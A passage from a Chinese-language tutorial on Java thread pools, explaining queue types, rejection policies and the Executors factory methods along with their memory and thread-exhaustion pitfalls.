当线程池里面存活的线程数已经等于corePoolSize了,并且任务队列workQueue也满，判断线程数是否达到maximumPoolSize，即最大线程数是否已满，如果没到达，创建一个非核心线程执行提交的任务。\n- 如果当前的线程数达到了maximumPoolSize，还有新的任务过来的话，直接采用拒绝策略处理。\n\n\n**工作队列**\n\n- ArrayBlockingQueue：ArrayBlockingQueue（有界队列）是一个用数组实现的有界阻塞队列，按FIFO排序量。插入和删除数据，只采用了一个 lock，并发效率略低于LinkedBlockingQueue。\n\n- LinkedBlockingQueue：LinkedBlockingQueue（可设置容量队列）基于链表结构的阻塞队列，按FIFO排序任务，容量可以选择进行设置，不设置的话，将是一个无边界的阻塞队列，最大长度为Integer.MAX_VALUE，插入和删除分别采用了putLock和takeLock，这样可以降低线程由于无法获取到 lock 而进入 WAITING 状态的可能性，从而提高了线程并发执行的效率。吞吐量通常要高于ArrayBlockingQuene；newFixedThreadPool线程池使用了这个队列。\n\n- DelayQueue：DelayQueue（延迟队列）是一个任务定时周期的延迟执行的队列。根据指定的执行时间从小到大排序，否则根据插入到队列的先后排序。newScheduledThreadPool线程池使用了这个队列\n\n- PriorityBlockingQueue：PriorityBlockingQueue（优先级队列）是具有优先级的无界阻塞队列；\n\n- SynchronousQueue：SynchronousQueue（同步队列）一个不存储元素的阻塞队列，每个插入操作必须等到另一个线程调用移除操作，否则插入操作一直处于阻塞状态，newCachedThreadPool线程池使用了这个队列。\n\n\n**拒绝策略**\n\n- AbortPolicy：中止策略，线程池默认的拒绝策略，也是我们最常用的拒绝策略。当线程池满载的时候，丢弃任务，并抛出RejectedExecutionException 异常信息。\n\n- DiscardPolicy：丢弃策略，一般我们都不会选择它，因为它直接就把任务丢弃掉了，我们毫无感知。如果任务不重要，丢弃掉也没有没关系，就可以使用它。\n\n- DiscardOldestPolicy：丢弃阻塞队列 workQueue 中最老的一个任务，并将新任务加入\n\n- CallerRunsPolicy：交给线程池调用所在的线程进行处理。\n\n\n**通过Executors创建**\n\n- newFixedThreadPool：固定数目线程的线程池，核心线程数和最大线程数大小一样，没有所谓的非空闲时间，即keepAliveTime为0，阻塞队列为无界队列LinkedBlockingQueue。newFixedThreadPool使用了无界的阻塞队列LinkedBlockingQueue，如果线程获取一个任务后，任务的执行时间比较长(比如，上面demo设置了10秒)，会导致队列的任务越积越多，导致机器内存使用不停飙升， 最终导致OOM。FixedThreadPool 适用于处理CPU密集型的任务，确保CPU在长期被工作线程使用的情况下，尽可能的少的分配线程，即适用执行长期的任务。\n\n- newCachedThreadPool：可缓存线程的线程池，核心线程数为0，最大线程数为Integer.MAX_VALUE，阻塞队列是SynchronousQueue，非核心线程空闲存活时间为60秒。当提交任务的速度大于处理任务的速度时，每次提交一个任务，就必然会创建一个线程。极端情况下会创建过多的线程，耗尽 CPU 和内存资源。由于空闲 60 秒的线程会被终止，长时间保持空闲的 CachedThreadPool 不会占用任何资源。\n\n\n- newSingleThreadExecutor：单线程的线程池，核心线程数为1，最大线程数也为1，阻塞队列是LinkedBlockingQueue，keepAliveTime为0，适用于串行执行任务的场景，一个任务一个任务地执行。\n\n- newScheduledThreadPool：定时及周期执行的线程池，最大线程数为Integer.MAX_VALUE，阻塞队列是DelayedWorkQueue，keepAliveTime为0，scheduleAtFixedRate() ：按某种速率周期执行，scheduleWithFixedDelay()：在某个延迟后执行。适用于周期性执行任务的场景，需要限制线程数量的场景。\n\n\n- newWorkStealingPool(java8新增)：基于ForkJoinPool，使用所有可用处理器作为目标并行度，创建一个窃取线程的池。如果一个线程完成了工作并且无事可做，则可以从另一线程的队列中\"窃取\"工作，适合于大型计算递归任务。"}]